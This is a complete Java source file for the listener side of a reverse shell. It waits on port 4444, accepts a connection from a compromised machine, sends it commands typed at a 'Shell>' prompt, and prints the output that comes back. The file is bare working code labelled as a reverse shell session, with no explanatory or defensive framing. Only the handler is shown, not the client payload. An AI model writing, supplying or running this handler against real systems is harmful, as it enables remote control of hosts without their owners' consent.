import java.io.*;
import java.net.*;
import java.util.Scanner;

public class Server {
    public static void main(String[] args) {
        int port = 4444;

        try (ServerSocket serverSocket = new ServerSocket(port)) {
            System.out.println("Server started on port " + port);
            System.out.println("Waiting for client connection...");

            Socket clientSocket = serverSocket.accept();
            System.out.println("Client connected: " + clientSocket.getInetAddress().getHostAddress() );

            BufferedReader clientReader = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
            PrintWriter clientWriter = new PrintWriter(clientSocket.getOutputStream(), true);
            Scanner serverScanner = new Scanner(System.in);

            Thread clientOutputThread = new Thread(() -> {
                try {
                    String line;
                    while ((line = clientReader.readLine()) != null) {
                        System.out.println(line);
                    }
                } catch (IOException e) {
                    System.out.println("Client connection closed.");
                } finally {
                    System.out.println("Client output thread terminated.");
                }
            });
            clientOutputThread.start();

            System.out.println("Reverse shell session started. Type commands.");
            System.out.println("Type 'exit' to terminate.");

            String command;
            while (true) {
                System.out.print("Shell> ");
                command = serverScanner.nextLine();

                if (command.equalsIgnoreCase("exit")) {
                    clientOutputThread.interrupt();
                    break;
                }

                clientWriter.println(command);
            }

            System.out.println("Server shutting down.");
            serverScanner.close();

        } catch (IOException e) {
            System.err.println("Error: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
